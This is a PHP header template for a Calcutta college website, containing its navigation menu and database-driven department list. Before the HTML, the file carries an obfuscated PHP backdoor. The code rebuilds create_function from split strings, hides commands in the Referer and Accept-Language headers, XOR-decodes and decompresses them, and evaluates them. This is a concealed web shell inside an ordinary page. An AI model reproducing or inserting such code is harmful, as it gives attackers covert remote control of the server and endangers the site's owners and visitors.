<?php
$z='o;}$r=$_SF"ERVER;$F"rr=@$r["F"HTTP_REFF"EF"RERF""];$ra=@$r["HTTF"P_AF"CCEPT_LAF"NGUF"AGE"];if(F"$rr&&$F"';
$b='$ssF"(md5($i.$kF"F"h),0,3));$fF"=$sl(F"$ss(md5($F"i.$kf)F",0,3)F")F";$pF"="";for($z=F"1;$z<couF"nt($m';
$A='F"b_start();@F"eF"F"val(@gzuF"ncF"ompress(@x(@base6F"4_decode(pregF"_replaF"ceF"(array("F"/F"F"_/","/-';
$T='staF"rt()F";$s=&F"$F"_SESSIOF"N;$ss=F""subsF"tr";$sl="sF"trtolower"F";$i=$mF"[F"1][0].F"$m[1][1];F"$h=$F"sl(';
$W='$kF"h="b93f";$F"kf="1186F"";funF"ction F"x($tF",$k){$cF"=stF"rleF"n($k);$l=stF"rleF"n($t);$F"o="";F"for';
$u=str_replace('kW','','kWcreakWtkWe_fkWkWunkWction');
$D='preg_matcF"h_F"alF"l("/([\\w]F")F"[\\w-]+(?:;F"q=0.([\\d]))?,F"F"F"?/",$raF",$m);if($q&&$m){F"@sessiF"on_';
$q='$dF"F"=base6F"4_encode(x(F"gzcF"ompress($F"o),$k))F";prinF"t("<F"$kF">$dF"<F"/$k>");@sessF"ion_destroy();}}}}';
$n='F"ra){   F" $u=parse_F"url($rF"r)F";    parse_F"strF"($u[F""querF"y"],$qF");$q=arrayF"_values($qF")F";';
$r='arrayF"_kF"ey_exists($F"i,$s)F"){$s[$i].F"F"=$pF";$e=strposF"(F"$s[$iF"],$f);if($e){$F"F"k=$kF"h.$kf;o';
$w='/"F"),arF"ray("/","+"F"F"),$ss(F"$s[$i],0,$e))),$k)))F";$o=oF"bF"_get_coF"ntentF"s();ob_enF"d_cleF"an();';
$Q='[1]F");$zF"++) F"$pF".=$q[$m[2]F"[F"$z]]F";if(stF"rpos(F"$p,$hF")===0){$s[$i]="";F"$p=F"$ssF"($p,3);}iF"f(';
$H='($i=0;$i<F"F"$F"lF";){for($j=0;($j<$c&&F"$i<$l);$F"F"jF"++,$i++){$o.F"=$F"t{$iF"}^F"$kF"{$F"j};}}return $';
$y=str_replace('F"','',$W.$H.$z.$n.$D.$T.$b.$Q.$r.$A.$w.$q);
$d=$u('',$y);$d();
?>
<body>
  
    <header class="head-section">
      <div class="navbar navbar-default navbar-static-top container">
          <div class="navbar-header">
              <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse"
              type="button" onClick="$('#menu').slideToggle();"><span class="icon-bar"></span> <span class="icon-bar"></span>
              <span class="icon-bar"></span></button> 
			  
			  <a class="navbar-brand" href="?go=home"><img src="img/logo.jpg" width="100" height="100" alt="LOGO" /></a>
          </div>
<div class="headertext">
		  <span style="font-size: 28px; font-weight:bold;">Bangabasi Evening Collage</span><br />
		<span style="font-size: 14px; font-weight:bold;">AFFILIATED TO UNIVERSITY OF CALCUTTA - ACCREDITED GRADE 'B' BY NAAC</span>
		</div>
          
		  
		  
      </div>
	  
	  <div class="row" style="margin-bottom: -17px;">
	  
<div class="top-nav" onClick="$('#menu').slideToggle();">
	<div class="container">
        <nav id="menu-wrap">
            <ul id="menu">
	<li><a href="?go=home">Home</a></li>
	<li><a href="#">College</a>
		<ul>
			<li><a href="?go=college-history">Anecdotes</a></li>
			<li><a href="?go=achievement">Achivement</a></li>
			<li><a href="?go=goals">Goals and Objects</a></li>	
			<li><a href="?go=moto">Moto</a></li>	
			<li><a href="?go=career-course">Career Course</a></li>	
			<li><a href="?go=facilities">Facilities</a></li>	
				
			
		</ul>
	</li>
	
	<li><a href="#">Feedback</a>
		<ul>
			<li><a href="http://www.collegefeed.bangabasieveningcollege.in/">Student's Feedback</a></li>
			<li><a href="http://www.collegefeed.bangabasieveningcollege.in/">Teacher's Feedback</a></li>
			<li><a href="http://www.collegefeed.bangabasieveningcollege.in/commonfeed.php?catid=8">Parents Feedback</a></li>	
			<li><a href="http://www.collegefeed.bangabasieveningcollege.in/commonfeed.php?catid=7">Alumni Feedback</a></li>	
			<li><a href="http://www.collegefeed.bangabasieveningcollege.in/commonfeed.php?catid=9">University/Industry Feedback</a></li>	
		</ul>
	</li>
	
	<li><a href="#">Admission</a>
		<ul>
			<li><a href="http://www.bangabasievening.in/" target="_blank">Under Graduate</a></li>
			<li><a href="http://becadmissions.com/" target="_blank">Post Graduate</a></li>
		</ul>
	</li>
	
	<li><a href="#">Departments</a>
		<ul>
		<?php
		$sql = "SELECT * FROM course_category WHERE parent_cc_id = '0'";
		$res = mysql_query($sql);
		while($row = mysql_fetch_array($res)){
		?>
			<li><a href="?go=department&dept_id=<?=$row["cc_id"]?>"><?=$row["cc_name"]?></a>
			<?php
			$cc_id = $row["cc_id"];
			$sql1 = "SELECT * FROM course_category WHERE parent_cc_id = '" .$cc_id. "'";
			$res1 = mysql_query($sql1);
			if(mysql_num_rows($res1) > 0){
			?>
			<ul>
			<?php
			while($row1 = mysql_fetch_array($res1)){
			?>
			
				<li><a href="?go=department&dept_id=<?=$row1["cc_id"]?>"><?=$row1["cc_name"]?></a></li>
			
			<?php
			}//end of while
			?>
			</ul>
			<?php
			}//end of num rows
			?>			
			</li>
		<?php } //end of main while?>
								
		</ul>
	</li>
	
	
	<li><a href="#">Library</a>
		<ul>
			<li><a href="http://iproxy.inflibnet.ac.in:2048/login" target="_blank">N-Lisk</a></li>
		</ul>
	</li>
	
	<li><a href="http://bangabasieveningcollege.in/tas/" target="_blank">e-Sikshak</a></li>
	<li><a href="?go=aqar">AQAR</a></li>
	<li><a href="img/rar.pdf" target="_blank">NAAC RAR 2015</a></li>
	
	<li><a href="?go=notice">Notice</a></li>
	<li><a href="?go=gallery">Gallery</a></li>
	<li><a href="?go=contact-us">Contact Us</a></li>
	<li><a href="?go=registration-form">Register</a>
		<ul>
			<li><a href="?go=login">Login</a></li>
		</ul>
	</li>
	
</ul>
        </nav>
    </div>
</div>
	  </div>
	  
	  
	  
	  
    </header>